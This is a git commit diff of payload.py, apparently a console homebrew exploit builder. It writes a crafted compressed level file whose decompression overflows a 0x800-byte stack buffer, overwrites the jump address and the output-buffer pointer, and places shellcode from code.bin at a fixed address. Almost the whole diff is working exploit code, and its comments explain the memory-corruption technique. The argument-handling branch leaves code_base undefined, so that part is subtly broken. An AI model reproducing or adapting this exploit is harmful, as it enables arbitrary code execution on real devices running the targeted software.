fe232bf4aa550332d6ef467b4004039c152a186b
smea <smealum@gmail.com>
2014-12-30 20:26:25 -0800

    Update payload.py

--- payload.py
+++ payload.py
@@ -14,21 +14,41 @@ def repBlock(length, disp):
 	code = 0x2000|(disp<<9)|(length)
 	return struct.pack('>H', code)
 
-code_addr = 0x021e7090
+code_data = bytearray(open("code.bin", "rb").read())
+if len(code_data)%0x1f > 0:
+	code_data += bytearray([0x00]*(0x1f-(len(code_data)%0x1f)))
+
+if len(sys.argv)<=2:
+	code_base = 0x02000000
+else:
+	code_addr = int(sys.argv[2], 0)
+
+code_addr = code_base + 0x824
 
 # first write the address we want to jump to
-data = rawBlock([(code_addr>>(i*8))&0xFF for i in range(4)])
+comp_data = rawBlock([(code_addr>>(i*8))&0xFF for i in range(4)])
 # then copy it over 0x820 bytes (minus the 4 we already wrote)
 # the decompression method outputs to a 0x800 fixed size stack buffer
 # and there's 0x20 bytes worth of pushed registers on the stack
-# if we copy more we'll overwrite the pointers to the output buffer
+# if we copy more we'll overwrite the pointer to the output buffer
 # which will in turn lead to us overwriting our payload and code...
 # which is why we should not write more than 0x820 bytes unless we know what we're doing
-data += repBlock(0x1FC, 0x4)
-data += repBlock(0x200, 0x4)
-data += repBlock(0x200, 0x4)
-data += repBlock(0x200, 0x4)
-data += repBlock(0x20, 0x4)
+comp_data += repBlock(0x1FC, 0x4)
+comp_data += repBlock(0x200, 0x4)
+comp_data += repBlock(0x200, 0x4)
+comp_data += repBlock(0x200, 0x4)
+comp_data += repBlock(0x20, 0x4)
+# turns out we do know what we're doing : we overwrite the destination buffer pointer with the address where we want to put our code
+# this way we have a fixed code address which will work wherever we trigger the exploit from, and we no longer rely on a heap address that might change
+overwrite_addr = 0x02000000
+comp_data += rawBlock([(overwrite_addr>>(i*8))&0xFF for i in range(4)])
+for i in range(0, len(code_data), 0x1f):
+	comp_data += rawBlock(code_data[i:i+0x1f])
+comp_data = struct.pack('<L', len(comp_data)) + comp_data
 
-data = struct.pack('<L', len(data)) + data
-open("comp.bin", "wb").write(data)
+header_data = struct.pack('<LLLL', 0x3, 0x0, 0x10, 0x20) # in order : type, dimensions, some data (objects ?) offset, compressed level data offset
+header_data += struct.pack('<LLLL', 0x0, 0x0, 0x0, 0x0) # "some data (objects ?)"
+
+data = header_data + comp_data
+
+open(sys.argv[1], "wb").write(data)
